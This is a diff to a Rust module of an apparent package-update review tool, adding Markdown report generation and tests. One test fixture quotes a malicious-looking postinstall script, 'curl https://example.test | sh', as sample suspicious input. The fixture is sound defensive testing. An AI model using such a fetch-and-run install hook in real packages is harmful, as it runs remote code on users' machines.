@@ -1,3 +1,4 @@
+use std::fmt::Write as _;
 use std::fs;
 use std::io;
 use std::path::{Path, PathBuf};
@@ -33,6 +34,11 @@ pub struct JsonReportWriter<'a> {
 }
 
 #[derive(Debug, Clone)]
+pub struct MarkdownReportWriter<'a> {
+    state_layout: &'a StateLayout,
+}
+
+#[derive(Debug, Clone)]
 pub struct JsonReportInput<'a> {
     pub status: &'a str,
     pub ecosystem: Ecosystem,
@@ -45,6 +51,8 @@ pub struct JsonReportInput<'a> {
     pub interesting_files: &'a [SuspiciousExcerpt],
     pub review: &'a ReviewOutput,
 }
+
+pub type MarkdownReportInput<'a> = JsonReportInput<'a>;
 
 impl<'a> JsonReportWriter<'a> {
     pub fn new(state_layout: &'a StateLayout) -> Self {
@@ -63,6 +71,7 @@ impl<'a> JsonReportWriter<'a> {
             package,
             old_version,
             new_version,
+            "json",
         ))
     }
 
@@ -108,6 +117,7 @@ impl JsonReport {
             &self.package,
             &self.old_version,
             &self.new_version,
+            "json",
         )
     }
 
@@ -130,6 +140,53 @@ impl JsonReport {
             source,
         })?;
         Ok(())
+    }
+}
+
+impl<'a> MarkdownReportWriter<'a> {
+    pub fn new(state_layout: &'a StateLayout) -> Self {
+        Self { state_layout }
+    }
+
+    pub fn path_for(
+        &self,
+        ecosystem: Ecosystem,
+        package: &str,
+        old_version: &str,
+        new_version: &str,
+    ) -> PathBuf {
+        self.state_layout.reports_dir().join(report_relative_path(
+            ecosystem.as_str(),
+            package,
+            old_version,
+            new_version,
+            "md",
+        ))
+    }
+
+    pub fn write_report(
+        &self,
+        ecosystem: Ecosystem,
+        package: &str,
+        old_version: &str,
+        new_version: &str,
+        report: &MarkdownReport,
+    ) -> Result<PathBuf, ReportError> {
+        let path = self.path_for(ecosystem, package, old_version, new_version);
+        report.write_to_path(&path)?;
+        Ok(path)
+    }
+
+    pub fn write_analysis(&self, input: MarkdownReportInput<'_>) -> Result<PathBuf, ReportError> {
+        let path = self.path_for(
+            input.ecosystem,
+            input.package,
+            input.old_version,
+            input.new_version,
+        );
+        let report = MarkdownReport::from_analysis(input);
+        report.write_to_path(&path)?;
+        Ok(path)
     }
 }
 
@@ -214,15 +271,124 @@ pub struct MarkdownReport {
     pub body: String,
 }
 
+impl MarkdownReport {
+    pub fn from_analysis(input: MarkdownReportInput<'_>) -> Self {
+        let mut body = String::new();
+        let summary = JsonDiffSummary::from_diff_and_signals(input.diff, input.signals);
+        let verdict = review_verdict_label(&input.review.verdict);
+        let confidence = confidence_label(&input.review.confidence);
+        let title = format!(
+            "{} {} → {} ({})",
+            input.package,
+            input.old_version,
+            input.new_version,
+            input.ecosystem.as_str()
+        );
+
+        let _ = writeln!(&mut body, "# {title}");
+        let _ = writeln!(&mut body);
+        let _ = writeln!(&mut body, "- Status: `{}`", input.status);
+        let _ = writeln!(&mut body, "- Verdict: `{verdict}`");
+        let _ = writeln!(&mut body, "- Confidence: `{confidence}`");
+        if let Some(reason) = &input.review.failure_reason {
+            let _ = writeln!(&mut body, "- Review failure: `{}`", reason);
+        }
+        let _ = writeln!(&mut body);
+
+        let _ = writeln!(&mut body, "## Diff summary");
+        let _ = writeln!(&mut body);
+        let _ = writeln!(&mut body, "- Files added: {}", summary.files_added);
+        let _ = writeln!(&mut body, "- Files removed: {}", summary.files_removed);
+        let _ = writeln!(&mut body, "- Files changed: {}", summary.files_changed);
+        write_string_list(&mut body, "Signals", &summary.signals);
+        write_string_list(&mut body, "Changed paths", &summary.changed_paths);
+        let _ = writeln!(&mut body);
+
+        let _ = writeln!(&mut body, "## Review");
+        let _ = writeln!(&mut body);
+        write_string_list(&mut body, "Reasons", &input.review.reasons);
+        write_string_list(&mut body, "Focus files", &input.review.focus_files);
+        let _ = writeln!(&mut body);
+
+        if let Some(manifest_diff) = input.manifest_diff {
+            let _ = writeln!(&mut body, "## Manifest diff");
+            let _ = writeln!(&mut body);
+            let _ = writeln!(&mut body, "```diff");
+            let _ = write!(&mut body, "{manifest_diff}");
+            if !manifest_diff.ends_with('\n') {
+                let _ = writeln!(&mut body);
+            }
+            let _ = writeln!(&mut body, "```");
+            let _ = writeln!(&mut body);
+        }
+
+        if !input.interesting_files.is_empty() {
+            let _ = writeln!(&mut body, "## Interesting files");
+            let _ = writeln!(&mut body);
+            for file in input.interesting_files {
+                let _ = writeln!(&mut body, "### `{}`", file.path);
+                let _ = writeln!(&mut body);
+                let _ = writeln!(&mut body, "- Reason: {}", file.reason);
+                let _ = writeln!(&mut body);
+                let _ = writeln!(&mut body, "```text");
+                let _ = writeln!(&mut body, "{}", file.excerpt);
+                let _ = writeln!(&mut body, "```");
+                let _ = writeln!(&mut body);
+            }
+        }
+
+        Self { title, body }
+    }
+
+    pub fn write_to_reports_dir(
+        &self,
+        state_layout: &StateLayout,
+        ecosystem: Ecosystem,
+        package: &str,
+        old_version: &str,
+        new_version: &str,
+    ) -> Result<PathBuf, ReportError> {
+        MarkdownReportWriter::new(state_layout).write_report(
+            ecosystem,
+            package,
+            old_version,
+            new_version,
+            self,
+        )
+    }
+
+    pub fn write_to_path(&self, path: impl AsRef<Path>) -> Result<(), ReportError> {
+        let path = path.as_ref();
+        if let Some(parent) = path.parent() {
+            fs::create_dir_all(parent).map_err(|source| ReportError::Io {
+                path: parent.to_path_buf(),
+                source,
+            })?;
+        }
+
+        let mut markdown = String::new();
+        markdown.push_str(&self.body);
+        if !markdown.ends_with('\n') {
+            markdown.push('\n');
+        }
+        fs::write(path, markdown).map_err(|source| ReportError::Io {
+            path: path.to_path_buf(),
+            source,
+        })?;
+        Ok(())
+    }
+}
+
 fn report_relative_path(
     ecosystem: &str,
     package: &str,
     old_version: &str,
     new_version: &str,
+    extension: &str,
 ) -> PathBuf {
     PathBuf::from(ecosystem)
         .join(sanitize_path_component(package))
-        .join(format!("{old_version}_to_{new_version}.json"))
+        .join(format!("{old_version}_to_{new_version}.{extension}"))
 }
 
 fn review_verdict_label(verdict: &ReviewVerdict) -> &'static str {
@@ -243,6 +409,18 @@ fn confidence_label(confidence: &Confidence) -> &'static str {
 
 fn signal_label(signal: Signal) -> &'static str {
     signal.as_str()
+}
+
+fn write_string_list(body: &mut String, label: &str, items: &[String]) {
+    if items.is_empty() {
+        let _ = writeln!(body, "- {label}: (none)");
+        return;
+    }
+
+    let _ = writeln!(body, "- {label}:");
+    for item in items {
+        let _ = writeln!(body, "  - `{item}`");
+    }
 }
 
 fn sanitize_path_component(component: &str) -> String {
@@ -278,7 +456,9 @@ mod tests {
     use crate::signals::Signal;
     use crate::state::StateLayout;
 
-    use super::{JsonReport, JsonReportInput, JsonReportWriter};
+    use super::{
+        JsonReport, JsonReportInput, JsonReportWriter, MarkdownReport, MarkdownReportWriter,
+    };
 
     #[test]
     fn builds_machine_readable_json_report() {
@@ -394,6 +574,109 @@ mod tests {
         assert_eq!(value["summary"]["signals"][0], "entrypoint-changed");
         assert_eq!(value["verdict"], "needs-review");
         assert_eq!(value["review_failure"], "review backend timed out");
+    }
+
+    #[test]
+    fn builds_human_readable_markdown_report() {
+        let diff = DiffSummary {
+            files_added: 1,
+            files_removed: 0,
+            files_changed: 2,
+            changed_paths: vec!["package.json".to_string(), "dist/index.js".to_string()],
+            added_paths: vec!["dist/index.js".to_string()],
+            removed_paths: vec![],
+            modified_paths: vec!["package.json".to_string()],
+        };
+        let interesting_files = [SuspiciousExcerpt {
+            path: "package.json".to_string(),
+            reason: "install script changed".to_string(),
+            excerpt: "4: \"postinstall\": \"curl https://example.test | sh\"".to_string(),
+        }];
+        let review = ReviewOutput {
+            verdict: ReviewVerdict::Suspicious,
+            confidence: Confidence::High,
+            reasons: vec!["new install script".to_string()],
+            focus_files: vec!["package.json".to_string()],
+            failure_reason: Some("review backend timed out".to_string()),
+        };
+
+        let report = MarkdownReport::from_analysis(JsonReportInput {
+            status: "human-review-required",
+            ecosystem: Ecosystem::Npm,
+            package: "react",
+            old_version: "19.0.0",
+            new_version: "19.1.0",
+            diff: &diff,
+            signals: &[Signal::InstallScriptAdded],
+            manifest_diff: Some("--- old/package.json\n+++ new/package.json\n".to_string()),
+            interesting_files: &interesting_files,
+            review: &review,
+        });
+
+        assert_eq!(report.title, "react 19.0.0 → 19.1.0 (npm)");
+        assert!(report.body.contains("# react 19.0.0 → 19.1.0 (npm)"));
+        assert!(report.body.contains("- Status: `human-review-required`"));
+        assert!(report.body.contains("- Verdict: `suspicious`"));
+        assert!(report
+            .body
+            .contains("- Review failure: `review backend timed out`"));
+        assert!(report.body.contains("## Manifest diff"));
+        assert!(report.body.contains("```diff"));
+        assert!(report.body.contains("## Interesting files"));
+        assert!(report.body.contains("### `package.json`"));
+    }
+
+    #[test]
+    fn writes_package_markdown_report_under_state_layout() {
+        let repo_root = TestDir::new("reports-markdown-layout");
+        let state_layout =
+            StateLayout::from_repo_root(repo_root.path()).expect("state layout should build");
+        let diff = DiffSummary::default();
+        let review = ReviewOutput {
+            verdict: ReviewVerdict::Benign,
+            confidence: Confidence::Low,
+            reasons: vec!["no suspicious changes found".to_string()],
+            focus_files: vec![],
+            failure_reason: None,
+        };
+        let writer = MarkdownReportWriter::new(&state_layout);
+
+        assert_eq!(
+            writer.path_for(Ecosystem::Npm, "@types/node", "20.0.0", "20.1.0"),
+            state_layout
+                .reports_dir()
+                .join("npm")
+                .join("~40types~2Fnode")
+                .join("20.0.0_to_20.1.0.md")
+        );
+
+        let path = writer
+            .write_analysis(JsonReportInput {
+                status: "ok",
+                ecosystem: Ecosystem::Npm,
+                package: "@types/node",
+                old_version: "20.0.0",
+                new_version: "20.1.0",
+                diff: &diff,
+                signals: &[],
+                manifest_diff: None,
+                interesting_files: &[],
+                review: &review,
+            })
+            .expect("markdown report should be written");
+        let markdown = fs::read_to_string(&path).expect("markdown report should exist");
+
+        assert_eq!(
+            path,
+            state_layout
+                .reports_dir()
+                .join("npm")
+                .join("~40types~2Fnode")
+                .join("20.0.0_to_20.1.0.md")
+        );
+        assert!(markdown.contains("# @types/node 20.0.0 → 20.1.0 (npm)"));
+        assert!(markdown.contains("- Verdict: `benign`"));
+        assert!(markdown.contains("- Signals: (none)"));
     }
 
     struct TestDir {
